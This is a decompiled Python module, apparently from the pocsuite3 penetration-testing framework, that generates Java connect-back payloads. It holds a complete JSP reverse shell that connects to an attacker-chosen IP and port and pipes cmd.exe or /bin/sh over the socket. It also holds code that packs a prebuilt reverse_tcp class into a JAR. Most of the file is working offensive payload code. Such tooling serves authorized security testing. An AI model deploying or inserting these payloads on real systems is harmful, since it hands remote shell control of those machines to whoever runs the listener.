# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: /Users/boyhack/programs/pocsuite3/pocsuite3/shellcodes/java.py
# Compiled at: 2019-03-15 03:35:12
# Size of source mod 2**32: 3894 bytes
import os
from .base import ShellCode
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.helper.archieve.jar import Jar
from pocsuite3.lib.core.common import read_binary
from pocsuite3.lib.core.enums import SHELLCODE_TYPE

class JavaShellCode(ShellCode):
    __doc__ = '\n        Class with shellcodes for java language\n    '

    def __init__(self, connect_back_ip='localhost', connect_back_port=5555, bad_chars=[
 '\x00'], shell_type=SHELLCODE_TYPE.JAR, make_jar=False):
        ShellCode.__init__(self, connect_back_ip=connect_back_ip, connect_back_port=connect_back_port, bad_chars=bad_chars)
        self.shell_type = shell_type
        self.make_jar = make_jar
        self.path_to_jar = ''

    def get_jsp(self, inline=False):
        """ Function to get java(jsp) shellcode """
        if not (self.connect_back_ip and self.connect_back_port):
            print('Settings for connectback listener must be defined')
            return False
        java_code = '\n            <%@page import="java.lang.*, java.util.*, java.io.*, java.net.*"%>\n            <%class StreamConnector extends Thread {\n                InputStream is;\n                OutputStream os;\n                StreamConnector( InputStream is, OutputStream os ) {\n                    this.is = is;\n                    this.os = os;\n                }\n                public void run() {\n                    BufferedReader in = null;\n                    BufferedWriter out = null;\n                    try {\n                        in = new BufferedReader( new InputStreamReader( this.is ) );\n                        out = new BufferedWriter( new OutputStreamWriter( this.os ) );\n                        char buffer[] = new char[8192];\n                        int length;\n                        while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 ) {\n                            out.write( buffer, 0, length ); out.flush();\n                        }\n                    } catch( Exception e ){\n                    }\n                    try {\n                        if( in != null ) in.close();\n                        if( out != null ) out.close();\n                    } catch( Exception e ){}\n                }\n            }\n            try {\n                String OS = System.getProperty("os.name").toLowerCase();\n                Socket socket = new Socket( "{{LOCALHOST}}", {{LOCALPORT}} );\n                String command = "cmd.exe";\n                if (OS.indexOf("win") < 0)\n                    command = "/bin/sh";\n                Process process = Runtime.getRuntime().exec(command);\n                (new StreamConnector(process.getInputStream(),socket.getOutputStream())).start();\n                (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();\n            } catch( Exception e ) {\n            }\n            %>\n        '
        java_code = self.format_shellcode(java_code)
        if inline:
            java_code = self.make_inline(java_code)
        return java_code

    def get_jar(self, filename=''):
        filepath = os.path.join(paths.POCSUITE_TMP_PATH, 'payload.jar')
        jar = Jar(filepath)
        data = '{host};{port}'.format(host=(self.connect_back_ip), port=(self.connect_back_port))
        jar.add_file('east/data.dat', data)
        path = os.path.join(paths.POCSUITE_ROOT_PATH, 'shellcodes/data/java/reverse_tcp/Payload.class')
        jar.add_file('east/Payload.class', read_binary(path))
        if self.make_jar:
            self.path_to_jar = filepath
        remove_jar = not self.make_jar
        return jar.get_raw(remove_jar)

    def get_shellcode(self, inline=False):
        shell = ''
        if self.shell_type == SHELLCODE_TYPE.JAR:
            shell = self.get_jar()
        else:
            if self.shell_type == SHELLCODE_TYPE.JSP:
                shell = self.get_jsp(inline)
        return shell